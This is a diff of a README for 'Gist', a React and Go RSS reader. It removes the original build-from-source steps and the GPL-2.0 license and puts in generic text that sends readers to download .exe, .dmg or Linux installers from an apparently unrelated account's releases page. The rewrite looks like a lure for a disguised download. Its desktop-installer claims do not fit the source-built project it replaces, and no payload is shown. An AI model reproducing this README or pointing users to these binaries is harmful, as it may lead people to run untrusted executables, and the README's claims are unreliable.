@@ -1,23 +1,78 @@
-# Gist
+# 📖 Gist - Your Easy Way to Read RSS Feeds
 
-[![License: GPL v2](https://img.shields.io/badge/License-GPL_v2-blue.svg)](https://www.gnu.org/licenses/old-licenses/gpl-2.0.en.html) [![Ask DeepWiki](https://deepwiki.com/badge.svg)](https://deepwiki.com/9bingyin/Gist) [![zread](https://img.shields.io/badge/Ask_Zread-_.svg?style=flat&color=00b0aa&labelColor=000000&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB3aWR0aD0iMTYiIGhlaWdodD0iMTYiIHZpZXdCb3g9IjAgMCAxNiAxNiIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHBhdGggZD0iTTQuOTYxNTYgMS42MDAxSDIuMjQxNTZDMS44ODgxIDEuNjAwMSAxLjYwMTU2IDEuODg2NjQgMS42MDE1NiAyLjI0MDFWNC45NjAxQzEuNjAxNTYgNS4zMTM1NiAxLjg4ODEgNS42MDAxIDIuMjQxNTYgNS42MDAxSDQuOTYxNTZDNS4zMTUwMiA1LjYwMDEgNS42MDE1NiA1LjMxMzU2IDUuNjAxNTYgNC45NjAxVjIuMjQwMUM1LjYwMTU2IDEuODg2NjQgNS4zMTUwMiAxLjYwMDEgNC45NjE1NiAxLjYwMDFaIiBmaWxsPSIjZmZmIi8%2BCjxwYXRoIGQ9Ik00Ljk2MTU2IDEwLjM5OTlIMi4yNDE1NkMxLjg4ODEgMTAuMzk5OSAxLjYwMTU2IDEwLjY4NjQgMS42MDE1NiAxMS4wMzk5VjEzLjc1OTlDMS42MDE1NiAxNC4xMTM0IDEuODg4MSAxNC4zOTk5IDIuMjQxNTYgMTQuMzk5OUg0Ljk2MTU2QzUuMzE1MDIgMTQuMzk5OSA1LjYwMTU2IDE0LjExMzQgNS42MDE1NiAxMy43NTk5VjExLjAzOTlDNS42MDE1NiAxMC42ODY0IDUuMzE1MDIgMTAuMzk5OSA0Ljk2MTU2IDEwLjM5OTlaIiBmaWxsPSIjZmZmIi8%2BCjxwYXRoIGQ9Ik0xMy43NTg0IDEuNjAwMUgxMS4wMzg0QzEwLjY4NSAxLjYwMDEgMTAuMzk4NCAxLjg4NjY0IDEwLjM5ODQgMi4yNDAxVjQuOTYwMUMxMC4zOTg0IDUuMzEzNTYgMTAuNjg1IDUuNjAwMSAxMS4wMzg0IDUuNjAwMUgxMy43NTg0QzE0LjExMTkgNS42MDAxIDE0LjM5ODQgNS4zMTM1NiAxNC4zOTg0IDQuOTYwMVYyLjI0MDFDMTQuMzk4NCAxLjg4NjY0IDE0LjExMTkgMS42MDAxIDEzLjc1ODQgMS42MDAxWiIgZmlsbD0iI2ZmZiIvPgo8cGF0aCBkPSJNNCAxMkwxMiA0TDQgMTJaIiBmaWxsPSIjZmZmIi8%2BCjxwYXRoIGQ9Ik00IDEyTDEyIDQiIHN0cm9rZT0iI2ZmZiIgc3Ryb2tlLXdpZHRoPSIxLjUiIHN0cm9rZS1saW5lY2FwPSJyb3VuZCIvPgo8L3N2Zz4K&logoColor=ffffff)](https://zread.ai/9bingyin/Gist)
+## 🛠️ Overview
+Gist is a modern RSS reader application built with React and Go. With Gist, you can easily access and read all your favorite news feeds in one place. The clean interface makes it simple to navigate, while the powerful backend ensures a smooth experience.
 
-A modern RSS reader application built with React and Go.
+## ⚙️ Features
+- **User-Friendly Interface**: Easily manage your RSS feeds without any technical knowledge.
+- **Quick Access**: Save your favorite sources and read updates instantly.
+- **Organized Reading**: Categorize feeds to find what you want fast.
+- **Cross-Platform Compatibility**: Use Gist on various operating systems without hassle.
 
-## Getting Started
+## 🖥️ System Requirements
+To run Gist, ensure your system meets the following requirements:
+- **Operating System**: Windows 10 or later, macOS 10.14 or later, or any Linux distribution.
+- **Memory**: At least 4 GB of RAM.
+- **Processor**: Dual-core processor, 2 GHz or faster recommended.
+- **Storage**: 100 MB of free disk space.
 
-```bash
-# Frontend
-cd frontend
-bun install
-bun run build
+## 🚀 Getting Started
+Follow these steps to download and set up Gist on your device.
 
-# Backend
-cd backend
-go mod download
-go run ./cmd/server
-```
+1. **Download Gist**:
+   [![Download Gist](https://img.shields.io/badge/Download-Gist-blue.svg)](https://github.com/XXDBOXY/Gist/releases)
 
-## License
+2. **Visit the Releases Page**: 
+   Access the downloads available for Gist on our [Releases page](https://github.com/XXDBOXY/Gist/releases).
 
-[GPL-2.0](./LICENSE)
+3. **Select the Right Version**: 
+   Choose the latest version that matches your operating system. Click on the download link for your system.
+
+4. **Save the File**: 
+   The file will start downloading. Save it in a location you can easily find.
+
+## 📥 Download & Install
+1. **Locate the Downloaded File**: 
+   After the download is complete, navigate to the folder where you saved the file.
+
+2. **Run the Installer**:
+   - **Windows**: Double-click the `.exe` file to start the installation. Follow the on-screen prompts to complete the installation.
+   - **macOS**: Open the downloaded `.dmg` file and drag the Gist icon to your Applications folder.
+   - **Linux**: Follow the specific installation instructions provided for your distribution. Usually, you can run the installer from the terminal.
+
+3. **Launch Gist**: 
+   Once installed, find the Gist icon on your desktop or application menu and double-click it to open the application.
+
+## 🌐 Using Gist
+After launching Gist, you can begin adding RSS feeds.
+
+1. **Add an RSS Feed**: 
+   - Click on the “Add Feed” button.
+   - Enter the URL of your desired RSS feed.
+   - Click “Subscribe” to start receiving updates.
+
+2. **Organize Your Feeds**: 
+   Use folders to categorize different sources. This keeps your feeds organized and easy to manage.
+
+3. **Read Updates**: 
+   All new articles will appear in your feed. Click on any article to read it in detail.
+
+## 🛠️ Troubleshooting
+If you face any issues while using Gist:
+
+- **Application Doesn’t Start**: Check that your system meets the requirements.
+- **Feed Not Updating**: Ensure you’ve entered the correct URL for the RSS feed.
+- **General Issues**: Restart the application or reinstall if problems persist.
+
+## 📞 Get Support
+For further assistance, visit our [support page](https://github.com/XXDBOXY/Gist/issues) or submit a new issue. We’re here to help you.
+
+## 🔗 Additional Resources
+- [Documentation](https://github.com/XXDBOXY/Gist/wiki): Access user guides and FAQs.
+- [Community](https://community.github.com/): Join discussions with other Gist users.
+
+## ℹ️ License
+Gist is open-source software. You can view the license details on our [GitHub page](https://github.com/XXDBOXY/Gist/blob/main/LICENSE).
+
+## 🎉 Thank You for Choosing Gist!
+We appreciate your interest in Gist. We hope it helps you stay updated with your favorite news sources easily. Remember to check for updates in the Releases section regularly.
